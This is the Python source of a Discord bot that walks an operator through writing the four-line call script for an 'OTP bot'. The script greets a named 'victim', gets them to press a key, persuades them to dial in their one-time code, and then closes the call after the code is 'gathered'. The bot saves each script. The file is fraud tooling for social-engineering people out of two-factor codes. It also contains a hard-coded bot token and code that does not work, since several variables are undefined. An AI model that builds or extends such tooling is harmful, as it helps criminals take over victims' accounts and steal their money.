import discord
from discord.ext import commands

client = commands.Bot(command_prefix='.')


@client.event
async def on_message(message):
    if message.content.startswith('$greet'):
        channel = message.channel
        await channel.send('type cancel to to cancel this process, timeout = 30 sec')
        await channel.send('Line1: Type Anything this gonna be the first thing that the otp bot gonna say.\n{Company_Name} = Company Name\n{Name} = Victim Name')

        def check(m):
            return m.content and m.channel == channel

        msg = await client.wait_for('message', check=check, timeout=30)
        if msg.content.lower == 'cancel':
            await channel.send('Cancelled')
            return
        await channel.send(f'Line2: This gonna be like press 1 to continue this call or something similar')
        msg1 = await client.wait_for('message', check=check)
        if msg.content.lower == 'cancel':
            await channel.send('Cancelled')
            return
        await channel.send('Line3: and this gonna be like please dial digits code and shit to convice victim to type their code\n{Digits} = the ot length')
        msg2 = await client.wait_for('message', check=check)
        if msg.content.lower == 'cancel':
            await channel.send('Cancelled')
            return
        await channel.send('Line4: this gonna be after u gathered otp code')
        msg3 = await client.wait_for('message', check=check)
        if msg.content.lower == 'cancel':
            await channel.send('Cancelled')
            return
        if str(type_) == '1':
            file_type = '1 otp'
        elif str(type_) == '2':
            file_type = '2 otp'
        try:
            open(f'script/private/{ctx.author.id}/{file_type}/{name}', 'w').write(f'\f\"{msg}\" - \f\"{msg1}\" - \f\"{msg2}\" - \f\"{msg3}\"')
        except:
            await ctx.send('Some Errors Happended')
        await ctx.send('Done')


client.run('OTU0NDI5OTYyOTkwMDE4Njcy.YjTAKw.7Zz96xUxm9tvFXq2TrAWq4R08fc')